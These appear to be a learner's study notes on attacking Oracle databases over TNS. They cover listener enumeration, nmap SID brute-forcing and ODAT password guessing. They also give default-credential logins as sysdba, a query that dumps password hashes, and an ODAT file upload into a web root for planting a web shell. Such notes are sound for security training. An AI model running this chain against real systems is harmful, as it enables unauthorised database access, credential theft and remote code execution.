## Oracle TNS

- **Transparent Network Substrate** — Oracle's protocol for client↔DB communication (name resolution, connection mgmt, load balancing, encryption).
- Listener default port **TCP 1521**. Remotely manageable in Oracle 8i/9i, not 10g/11g by default.
- Config files (`$ORACLE_HOME/network/admin`): **`tnsnames.ora`** (client-side, maps service names → address) and **`listener.ora`** (server-side, defines listener + SIDs).

## SID (System Identifier)
- Unique name for a **database instance**. A client must specify the right SID (or service name) to connect — wrong SID = connection fails.
- Enumerating a valid SID is the first real step. Default example SID: **`XE`** (Express Edition).

## Footprinting
```bash
# 1. find/confirm the listener + version
sudo nmap -p1521 -sV <TARGET> --open

# 2. brute-force the SID
sudo nmap -p1521 -sV <TARGET> --open --script oracle-sid-brute      # -> e.g. XE

# 3. ODAT — all modules (enumerate + password-guess accounts)
./odat.py all -s <TARGET>                                           # -> finds valid creds e.g. scott/tiger
```
> ODAT = Oracle Database Attacking Tool (SID guess, password guess, file upload, privesc, CVEs).

## Connect & enumerate (sqlplus)
```bash
sqlplus scott/tiger@<TARGET>/XE                 # normal login
sqlplus scott/tiger@<TARGET>/XE as sysdba       # try DBA — often works, huge privesc
```
```sql
select table_name from all_tables;        -- list tables

select name, password from sys.user$;     -- DUMP PASSWORD HASHES -> crack offline (needs sysdba)
```

## Exploitation — file upload (RCE path)
```bash
echo "test" > testing.txt
./odat.py utlfile -s <TARGET> -d XE -U scott -P tiger --sysdba \
  --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl http://<TARGET>/testing.txt          # confirm write
```
Default webroots: Linux `/var/www/html`, Windows `C:\inetpub\wwwroot`. Upload a web shell there → code execution.

## Notes to self
- Flow: **nmap 1521 → sid-brute (get SID) → odat password-guess (get creds) → sqlplus → `as sysdba` → dump `sys.user$` hashes or utlfile web shell.**
- `scott/tiger` with no admin role can still often log in `as sysdba` → instant DBA.
- Setup pain: ODAT needs `cx_Oracle`; sqlplus needs `oracle-instantclient-sqlplus` (fix `libsqlplus.so` via ldconfig).
